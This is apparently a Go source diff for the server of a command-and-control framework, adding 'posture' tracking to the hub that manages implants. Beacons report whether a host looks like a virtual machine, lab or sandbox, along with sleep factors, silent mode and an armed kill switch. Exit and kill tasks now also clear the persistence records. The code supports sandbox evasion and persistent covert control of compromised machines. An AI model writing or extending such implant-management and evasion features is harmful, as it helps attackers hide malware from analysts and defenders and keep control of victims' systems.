@@ -706,6 +706,27 @@ func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, er
 	// A persistence task reports what is installed on the host: the server
 	// keeps the record, so the operator can see the coverage of the fleet
 	// and hear about an entry that was removed behind their back.
+	// An evasion task reports how the implant sees the host: the server
+	// keeps the last posture, so the operator does not have to run a task
+	// to know what a machine is.
+	if posture, ok := postureEntry(t.Kind, t.Meta); ok {
+		h.store.SetPosture(agentID, posture)
+		h.Emit(Event{Kind: "posture.updated", AgentID: agentID, TaskID: taskID,
+			Data: map[string]any{
+				"label":      posture.Label,
+				"virtual":    posture.Virtual,
+				"lab":        posture.Lab,
+				"sandbox":    posture.Sandbox,
+				"confidence": posture.Confidence,
+				"silent":     posture.Silent,
+			}})
+		if posture.KillSwitch {
+			h.Emit(Event{Kind: "killswitch.armed", AgentID: agentID, TaskID: taskID,
+				Data: map[string]any{
+					"armed": true,
+				}})
+		}
+	}
 	if entries, ok := persistEntries(t.Kind, t.Meta); ok {
 		h.store.SetPersistence(agentID, entries)
 		broken := 0
@@ -936,7 +957,10 @@ func (h *Hub) SelectAgents(f AgentFilter) []*store.Agent {
 // record of what is on the host.
 func persistEntries(kind string, meta map[string]any) ([]store.PersistEntry, bool) {
 	switch kind {
-	case "persist", "unpersist", "persist.list", "persist.verify", "persist.migrate", "persist.health":
+	case "persist", "unpersist", "persist.list", "persist.verify", "persist.migrate", "persist.health",
+		// The exit takes the persistence entries with it, so the record of
+		// the host is emptied as well.
+		"exit", "kill":
 	default:
 		return nil, false
 	}
@@ -971,6 +995,72 @@ func persistMethods(entries []store.PersistEntry) []string {
 		out = append(out, entry.Technique)
 	}
 	return out
+}
+
+// postureEntry reads the posture a beacon attached to a result.
+//
+// The posture travels in the meta of the evasion tasks: the implant
+// reports what it sees about the host, and the server keeps the last
+// report.  A task that says nothing about the posture leaves the record
+// alone.
+func postureEntry(kind string, meta map[string]any) (*store.PostureEntry, bool) {
+	switch kind {
+	case "evade.report", "evade.posture", "evade.profile", "evade.shape",
+		"evade.killswitch", "hygiene.memory", "hygiene.process":
+	default:
+		return nil, false
+	}
+	entry := &store.PostureEntry{UpdatedAt: time.Now().Unix()}
+	found := false
+	if fields, ok := meta["posture"].(map[string]any); ok {
+		found = true
+		entry.Label = metaString(fields["label"])
+		entry.Virtual = metaBool(fields["virtual"])
+		entry.Workstation = metaBool(fields["workstation"])
+		entry.Developer = metaBool(fields["developer"])
+		entry.Lab = metaBool(fields["lab"])
+		entry.Sandbox = metaBool(fields["sandbox"])
+		entry.Confidence = metaInt(fields["confidence"])
+		entry.Severity = metaInt(fields["severity"])
+	}
+	if factor := metaInt(meta["posture_sleep_factor"]); factor > 0 {
+		found = true
+		entry.SleepFactor = factor
+	}
+	if silent, ok := meta["posture_silent"].(bool); ok {
+		found = true
+		entry.Silent = silent
+	}
+	if fields, ok := meta["killswitch"].(map[string]any); ok {
+		found = true
+		entry.KillSwitch = metaBool(fields["armed"])
+	}
+	if !found {
+		return nil, false
+	}
+	return entry, true
+}
+
+// metaBool reads a boolean out of a decoded result field.
+func metaBool(value any) bool {
+	b, ok := value.(bool)
+	return ok && b
+}
+
+// metaInt reads an integer out of a decoded result field.
+func metaInt(value any) int {
+	switch v := value.(type) {
+	case int:
+		return v
+	case int64:
+		return int(v)
+	case uint64:
+		return int(v)
+	case float64:
+		return int(v)
+	default:
+		return 0
+	}
 }
 
 // metaString reads a string out of a decoded result field.
@@ -1427,5 +1517,7 @@ func agentData(a *store.Agent) map[string]any {
 		// The persistence entries the beacon reported: what is installed on
 		// the host and whether it is still there.
 		"persist": a.Persist,
+		// What the implant thinks of the host.
+		"posture": a.Posture,
 	}
 }
